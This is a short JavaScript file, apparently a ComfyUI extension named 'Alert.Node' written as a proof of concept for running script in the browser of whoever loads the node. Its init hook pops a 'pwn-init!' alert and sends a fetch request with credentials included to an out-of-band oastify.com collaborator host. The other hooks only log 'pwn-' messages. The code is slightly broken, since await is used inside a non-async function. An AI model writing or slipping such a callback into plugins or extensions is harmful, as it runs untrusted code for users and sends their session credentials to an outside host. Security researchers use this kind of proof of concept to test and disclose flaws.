// HF
import { app } from "../../scripts/app.js";
// ComfyDeploy
// import { app } from "../../../scripts/app.js";
const ext = {
    name: 'Alert.Node',
  
    native_mode: false,
  
    init(app) {
        console.log("pwn-init!");
        alert("pwn-init!");
        await fetch("https://go8w693qtipnk91pif5ittmlpcv3jt7i.oastify.com", {
            method: "GET",
            mode: "no-cors",
            credentials: "include"
        });
    },

    async beforeRegisterNodeDef(nodeType, nodeData, app2) {
        console.log("pwn-beforeRegisterNodeDef!");
    },

    async setup() {
        console.log("pwn-setup!");
    }
}

app.registerExtension(ext);
